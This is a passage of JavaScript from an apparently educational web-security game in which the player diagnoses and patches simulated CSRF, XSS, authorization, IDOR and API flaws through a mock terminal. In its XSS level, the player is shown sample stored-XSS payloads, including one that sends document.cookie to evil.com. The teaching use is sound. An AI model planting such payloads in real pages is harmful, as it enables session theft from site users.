  addTerminalLine("---", "");
  addTerminalLine("Run enable-csrf-protection to fix this vulnerability.", "warning");
}

function fixCSRF() {
  if (gameState.vulnerabilitiesFixed.has("csrf_protection")) {
    addTerminalLine("CSRF protection already enabled.", "info");
    return;
  }

  addTerminalLine("Implementing CSRF protection...", "info");
  addTerminalLine("---", "");
  addTerminalLine("✅ Generated unique CSRF tokens per session", "success");
  addTerminalLine("✅ Added token validation to all state-changing requests", "success");
  addTerminalLine("✅ Configured SameSite cookie attribute", "success");
  addTerminalLine("✅ Validated Origin/Referer headers", "success");
  addTerminalLine("✅ Tested protection against forged requests", "success");
  addTerminalLine("---", "");
  addTerminalLine("🛡️ CSRF vulnerability patched!", "success");

  gameState.vulnerabilitiesFixed.add("csrf_protection");
  if (gameState.vulnerabilitiesFixed.has("missing_csrf_token")) {
    gameState.vulnerabilitiesFixed.add("missing_csrf_token");
  }

  const apiNode = gameState.networkNodes.find((n) => n.id === "api-backend");
  if (apiNode) apiNode.status = "healthy";

  renderNetworkMap();
  checkLevelComplete();
}

// Level 5: XSS Functions
function analyzeXSS() {
  addTerminalLine("Searching for malicious scripts in database...", "info");
  addTerminalLine("---", "");
  addTerminalLine("Found 3 comments containing <script> tags:", "error");
  addTerminalLine("1. <script>window.location='https://evil.com?cookie='+document.cookie</script>", "error");
  addTerminalLine("2. <img src=x onerror='steal_cookies()'>", "error");
  addTerminalLine("3. <iframe src='javascript:malicious()'>", "error");
  addTerminalLine("---", "");
  addTerminalLine("🔴 STORED XSS VULNERABILITY!", "error");
  addTerminalLine("These scripts will execute in every user's browser!", "error");
}

function fixXSS() {
  if (gameState.vulnerabilitiesFixed.has("stored_xss")) {
    addTerminalLine("XSS vulnerability already fixed.", "info");
    return;
  }

  addTerminalLine("Sanitizing user input and fixing XSS...", "info");
  addTerminalLine("---", "");
  addTerminalLine("✅ Replaced innerHTML with textContent", "success");
  addTerminalLine("✅ Implemented DOMPurify for HTML sanitization", "success");
  addTerminalLine("✅ Encoded special characters in output", "success");
  addTerminalLine("✅ Removed malicious scripts from database", "success");
  addTerminalLine("✅ Updated all render functions", "success");
  addTerminalLine("---", "");
  addTerminalLine("🛡️ Stored XSS vulnerability eliminated!", "success");

  gameState.vulnerabilitiesFixed.add("stored_xss");
  if (gameState.vulnerabilitiesFixed.has("reflected_xss")) {
    gameState.vulnerabilitiesFixed.add("reflected_xss");
  }

  const commentNode = gameState.networkNodes.find((n) => n.id === "comment-system");
  if (commentNode) commentNode.status = "healthy";

  renderNetworkMap();
  checkLevelComplete();
}

function addCSP() {
  if (gameState.vulnerabilitiesFixed.has("missing_csp")) {
    addTerminalLine("Content Security Policy already configured.", "info");
    return;
  }

  addTerminalLine("Adding Content Security Policy headers...", "info");
  addTerminalLine("---", "");
  addTerminalLine("✅ Added CSP header to Nginx configuration", "success");
  addTerminalLine("✅ Restricted script sources to 'self'", "success");
  addTerminalLine("✅ Disabled inline scripts and eval()", "success");
  addTerminalLine("✅ Configured reporting endpoint", "success");
  addTerminalLine("✅ Tested policy in enforcement mode", "success");
  addTerminalLine("---", "");
  addTerminalLine("CSP Header:", "info");
  addTerminalLine("Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';", "");
  addTerminalLine("---", "");
  addTerminalLine("🛡️ Defense in depth: CSP will block XSS even if sanitization fails!", "success");

  gameState.vulnerabilitiesFixed.add("missing_csp");

  const webNode = gameState.networkNodes.find((n) => n.id === "web-server");
  if (webNode) webNode.status = "healthy";

  renderNetworkMap();
  checkLevelComplete();
}

// Level 6: Authentication Bypass Functions
function checkAuth() {
  addTerminalLine("Auditing authorization checks...", "info");
  addTerminalLine("---", "");
  addTerminalLine("⚠️ Admin panel: Only checks login, NOT role!", "error");
  addTerminalLine("⚠️ API endpoints: Missing ownership validation!", "error");
  addTerminalLine("⚠️ Session tokens: Predictable format detected!", "error");
  addTerminalLine("---", "");
  addTerminalLine("Attack Chain Identified:", "warning");
  addTerminalLine("1. Regular user accesses admin panel (no role check)", "warning");
  addTerminalLine("2. User modifies other users' data (IDOR)", "warning");
  addTerminalLine("3. Attacker forges session tokens (predictable IDs)", "warning");
  addTerminalLine("4. Privilege escalation to admin complete", "warning");
}

function fixAuth() {
  if (gameState.vulnerabilitiesFixed.has("auth_bypass")) {
    addTerminalLine("Authorization checks already fixed.", "info");
    return;
  }

  addTerminalLine("Adding proper authorization checks...", "info");
  addTerminalLine("---", "");
  addTerminalLine("✅ Added role-based access control (RBAC)", "success");
  addTerminalLine("✅ Implemented object-level authorization", "success");
  addTerminalLine("✅ Added ownership validation to all endpoints", "success");
  addTerminalLine("✅ Middleware now checks both authentication AND authorization", "success");
  addTerminalLine("✅ Admin endpoints require 'admin' role", "success");
  addTerminalLine("---", "");
  addTerminalLine("🛡️ Authorization bypass fixed!", "success");

  gameState.vulnerabilitiesFixed.add("auth_bypass");

  const adminNode = gameState.networkNodes.find((n) => n.id === "admin-panel");
  if (adminNode) adminNode.status = "healthy";

  renderNetworkMap();
  checkLevelComplete();
}

function fixSession() {
  if (gameState.vulnerabilitiesFixed.has("broken_access_control")) {
    addTerminalLine("Session tokens already secured.", "info");
    return;
  }

  addTerminalLine("Securing session token generation...", "info");
  addTerminalLine("---", "");
  addTerminalLine("✅ Replaced predictable IDs with cryptographically random tokens", "success");
  addTerminalLine("✅ Using crypto.randomBytes(32) for session IDs", "success");
  addTerminalLine("✅ Invalidated all existing sessions", "success");
  addTerminalLine("✅ Added session rotation on privilege change", "success");
  addTerminalLine("✅ Configured secure session settings", "success");
  addTerminalLine("---", "");
  addTerminalLine("Old: user_1699632000_042 (predictable)", "error");
  addTerminalLine("New: a8f5c2e9b4d1f7a3e6c9b2d5f8a1c4e7b... (cryptographically random)", "success");
  addTerminalLine("---", "");
  addTerminalLine("🛡️ Session hijacking vulnerability eliminated!", "success");

  gameState.vulnerabilitiesFixed.add("broken_access_control");

  const sessionNode = gameState.networkNodes.find((n) => n.id === "session-store");
  if (sessionNode) sessionNode.status = "healthy";

  renderNetworkMap();
  checkLevelComplete();
}

// Level 7: API Security Functions
function analyzeAPI() {
  addTerminalLine("Running API security audit...", "info");
  addTerminalLine("---", "");
  addTerminalLine("FINDINGS:", "error");
  addTerminalLine("❌ No rate limiting - allows enumeration attacks", "error");
  addTerminalLine("❌ IDOR - users can access any user's data", "error");
  addTerminalLine("❌ Excessive data exposure - returns sensitive fields", "error");
  addTerminalLine("---", "");
  addTerminalLine("IMPACT:", "warning");
  addTerminalLine("Attacker enumerated all 10,000 users in 60 seconds", "warning");
  addTerminalLine("Exfiltrated 450MB of PII including SSNs and salaries", "warning");
  addTerminalLine("No authorization prevents access to other users' data", "warning");
}

function addRateLimit() {
  if (gameState.vulnerabilitiesFixed.has("missing_rate_limiting")) {
    addTerminalLine("Rate limiting already enabled.", "info");
    return;
  }

  addTerminalLine("Implementing rate limiting...", "info");
  addTerminalLine("---", "");
  addTerminalLine("✅ Configured Kong rate limit plugin", "success");
  addTerminalLine("✅ Set limit: 100 requests per minute per IP", "success");
  addTerminalLine("✅ Added 429 Too Many Requests responses", "success");
  addTerminalLine("✅ Implemented exponential backoff", "success");
  addTerminalLine("✅ Tested enumeration attack prevention", "success");
  addTerminalLine("---", "");
  addTerminalLine("🛡️ User enumeration attacks blocked!", "success");

  gameState.vulnerabilitiesFixed.add("missing_rate_limiting");

  const gatewayNode = gameState.networkNodes.find((n) => n.id === "api-gateway");
  if (gatewayNode) gatewayNode.status = "healthy";

  renderNetworkMap();
  checkLevelComplete();
}

function fixIDOR() {
  if (gameState.vulnerabilitiesFixed.has("broken_object_authorization")) {
    addTerminalLine("Object-level authorization already fixed.", "info");
    return;
  }

  addTerminalLine("Fixing Insecure Direct Object References...", "info");
  addTerminalLine("---", "");
  addTerminalLine("✅ Added ownership checks to all endpoints", "success");
  addTerminalLine("✅ Users can only access their own data", "success");
  addTerminalLine("✅ Admins can access all data (with audit logging)", "success");
  addTerminalLine("✅ Implemented authorization middleware", "success");
  addTerminalLine("✅ Tested with different user roles", "success");
  addTerminalLine("---", "");
  addTerminalLine("BEFORE: GET /api/users/123 (anyone can access)", "error");
  addTerminalLine("AFTER: GET /api/users/123 (only user 123 or admin)", "success");
  addTerminalLine("---", "");
  addTerminalLine("🛡️ IDOR vulnerability eliminated!", "success");

  gameState.vulnerabilitiesFixed.add("broken_object_authorization");

  const userAPI = gameState.networkNodes.find((n) => n.id === "user-api");
  if (userAPI) userAPI.status = "healthy";

  renderNetworkMap();
  checkLevelComplete();
}

function fixDataExposure() {
  if (gameState.vulnerabilitiesFixed.has("excessive_data_exposure")) {
    addTerminalLine("Sensitive data filtering already implemented.", "info");
    return;
  }

  addTerminalLine("Filtering sensitive fields from API responses...", "info");
  addTerminalLine("---", "");
  addTerminalLine("✅ Created response DTOs (Data Transfer Objects)", "success");
  addTerminalLine("✅ Removed SSN, salary, and internal notes from responses", "success");
  addTerminalLine("✅ Implemented field-level permissions", "success");
  addTerminalLine("✅ Regular users see: id, username, firstName, lastName", "success");
  addTerminalLine("✅ Admins see additional fields based on need-to-know", "success");
  addTerminalLine("---", "");
  addTerminalLine("BEFORE: Returns 15 fields including SSN, salary, etc.", "error");
  addTerminalLine("AFTER: Returns 4 public fields to regular users", "success");
  addTerminalLine("---", "");
  addTerminalLine("🛡️ Data exposure minimized!", "success");

  gameState.vulnerabilitiesFixed.add("excessive_data_exposure");

  const authzNode = gameState.networkNodes.find((n) => n.id === "authorization");
  if (authzNode) authzNode.status = "healthy";

  renderNetworkMap();
  checkLevelComplete();
}

// Disconnect from Node
function disconnectNode() {
  const node = gameState.networkNodes.find((n) => n.id === gameState.currentNode);
  addTerminalLine("logout", "");
  addTerminalLine(`Disconnected from ${node.hostname}`, "info");
  addTerminalLine("---", "");

  gameState.currentNode = null;
  updateNPCPanel(null);
  renderNetworkMap();
  renderCommands();
}

// Talk to NPC
function talkToNPC() {
  const node = gameState.networkNodes.find((n) => n.id === gameState.currentNode);

  if (!node || !node.npc) {
    return;
  }

  showDialog(node.npc.name, node.npc.dialog);
}

// Show Dialog
function showDialog(npcName, message) {
  dialogNPC.textContent = npcName;
  dialogBody.textContent = message;
  dialogModal.classList.add("show");
}

// Close Dialog
function closeDialog() {
  dialogModal.classList.remove("show");
}

// Check if Level is Complete
function checkLevelComplete() {
  const allVulnsFixed = gameState.currentLevel.vulnerabilities.every((v) =>
    gameState.vulnerabilitiesFixed.has(v)
  );

  if (allVulnsFixed) {
    setTimeout(() => {
      showVictory();
    }, 1000);
  }
}

// Show Victory
function showVictory() {
  gameState.completedLevels.add(gameState.currentLevel.id);

  // Save progress
  saveGameState();

  const victoryMessage = document.getElementById("victoryMessage");
  const nextLevelBtn = document.getElementById("nextLevelBtn");

  // Clear previous content safely
  victoryMessage.textContent = "";

  // Create greeting
  const greetingText = document.createElement("p");
  const greetingStrong = document.createElement("strong");
  greetingStrong.textContent = "Excellent work, Security Engineer!";
  greetingText.appendChild(greetingStrong);
  victoryMessage.appendChild(greetingText);

  // Create level name
  const levelText = document.createElement("p");
  levelText.textContent = "You successfully completed: ";
  const levelName = document.createElement("strong");
  levelName.textContent = gameState.currentLevel.name;
  levelText.appendChild(levelName);
  victoryMessage.appendChild(levelText);

  // Create concepts learned section
  const conceptsHeading = document.createElement("p");
  const conceptsStrong = document.createElement("strong");
  conceptsStrong.textContent = "What you learned:";
  conceptsHeading.appendChild(conceptsStrong);
  victoryMessage.appendChild(conceptsHeading);

  const conceptsList = document.createElement("ul");
  conceptsList.style.textAlign = "left";
  conceptsList.style.display = "inline-block";

  gameState.currentLevel.concepts.forEach((concept) => {
    const li = document.createElement("li");
    li.textContent = concept;
    conceptsList.appendChild(li);
  });
  victoryMessage.appendChild(conceptsList);

  // Create vulnerabilities section
  const vulnHeading = document.createElement("p");
  const vulnStrong = document.createElement("strong");
  vulnStrong.textContent = "Vulnerabilities Fixed:";
  vulnHeading.appendChild(vulnStrong);
  victoryMessage.appendChild(vulnHeading);

  const vulnList = document.createElement("ul");
  vulnList.style.textAlign = "left";
  vulnList.style.display = "inline-block";

  gameState.currentLevel.vulnerabilities.forEach((v) => {
    const li = document.createElement("li");
    li.textContent = `✅ ${v.replace(/_/g, " ").toUpperCase()}`;
    vulnList.appendChild(li);
  });
  victoryMessage.appendChild(vulnList);

  // Add learning resources if available
  if (gameState.currentLevel.resources && gameState.currentLevel.resources.length > 0) {
    const resourcesHeading = document.createElement("p");
    const resourcesStrong = document.createElement("strong");
    resourcesStrong.textContent = "📚 Learn More:";
    resourcesHeading.appendChild(resourcesStrong);
    resourcesHeading.style.marginTop = "20px";
    victoryMessage.appendChild(resourcesHeading);

    const resourcesList = document.createElement("ul");
    resourcesList.style.textAlign = "left";
    resourcesList.style.display = "inline-block";

    gameState.currentLevel.resources.forEach((resource) => {
      const li = document.createElement("li");
      const link = document.createElement("a");
      link.href = resource.url;
      link.target = "_blank";
      link.rel = "noopener noreferrer";
      link.textContent = resource.title;
      link.style.color = "var(--accent-blue)";
      link.style.textDecoration = "none";
      li.appendChild(link);
      resourcesList.appendChild(li);
    });
    victoryMessage.appendChild(resourcesList);
  }

  // Check if there's a next level
  const currentLevelIndex = LEVEL_ORDER.indexOf(gameState.currentLevel.id);
  const hasNextLevel = currentLevelIndex < LEVEL_ORDER.length - 1;

  if (hasNextLevel) {
    const nextLevelText = document.createElement("p");
    nextLevelText.textContent = "Ready for the next challenge?";
    victoryMessage.appendChild(nextLevelText);
    nextLevelBtn.style.display = "inline-block";
  } else {
    const congratsText = document.createElement("p");
    const congratsStrong = document.createElement("strong");
    congratsStrong.textContent = "🎉 Congratulations! You've completed all levels!";
    congratsText.appendChild(congratsStrong);
    victoryMessage.appendChild(congratsText);

    const masteryText = document.createElement("p");
    masteryText.textContent = "You've mastered the fundamentals of web security!";
    victoryMessage.appendChild(masteryText);

    nextLevelBtn.style.display = "none";
  }

  victoryModal.classList.add("show");
}

// Go to Next Level
function goToNextLevel() {
  victoryModal.classList.remove("show");
  const currentLevelIndex = LEVEL_ORDER.indexOf(gameState.currentLevel.id);
  const nextLevelId = LEVEL_ORDER[currentLevelIndex + 1];
  startLevel(nextLevelId);
}

// Add Terminal Line
function addTerminalLine(text, className = "") {
  const line = document.createElement("div");
  line.className = `terminal-line ${className}`;
  if (className === "command") {
    // Commands get a prompt prefix
    line.innerHTML = `<span style="color: var(--accent-blue)">$ </span>${text}`;
  } else {
    line.textContent = text;
  }
  terminalOutputEl.appendChild(line);
}

// Scroll Terminal to Bottom
function scrollTerminalToBottom() {
  terminalOutputEl.scrollTop = terminalOutputEl.scrollHeight;
}

// Start the game
init();
